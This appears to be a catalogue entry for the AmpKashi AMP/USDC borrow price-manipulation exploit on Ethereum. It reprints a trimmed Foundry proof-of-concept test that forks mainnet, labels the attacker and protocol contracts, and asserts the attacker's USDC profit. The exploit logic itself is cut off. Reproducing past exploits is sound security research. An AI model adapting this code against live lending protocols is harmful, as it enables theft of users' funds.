# [?] AmpKashi - AMP Collateral Borrow Price Manipulation

## Summary
Severity: Unknown
Chain: Ethereum
Component: AmpKashi
Published: 2025-04-07
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/AmpKashi_exp.sol
Type: defi-exploit-poc

## Details
Lost: $572.31

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant usdc = IERC20(USDC_TOKEN);

    function setUp() public {
        vm.createSelectFork("mainnet", 22_217_307);

        fundingToken = USDC_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(BALANCER_VAULT_ADDR, "Balancer Vault");
        vm.label(BENTOBOX, "BentoBox");
        vm.label(KASHI_PAIR, "Kashi AMP/USDC pair");
        vm.label(AMP_TOKEN, "AMP");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerUsdcBefore = usdc.balanceOf(ATTACKER);

        AmpKashiExploit exploit = new AmpKashiExploit();
        exploit.attack();

        uint256 attackerProfit = usdc.balanceOf(ATTACKER) - attackerUsdcBefore;
        assertGt(attackerProfit, 572_000_000);
    }
}

contract AmpKashiExploit is IBalancerFlashLoanRecipient {
    IERC20 private constant weth = IERC20(WETH_TOKEN);
    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IERC20 private constant amp = IERC20(AMP_TOKEN);
    IBentoBoxV1 private constant bentoBox = IBentoBoxV1(BENTOBOX);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/AmpKashi_exp.sol_
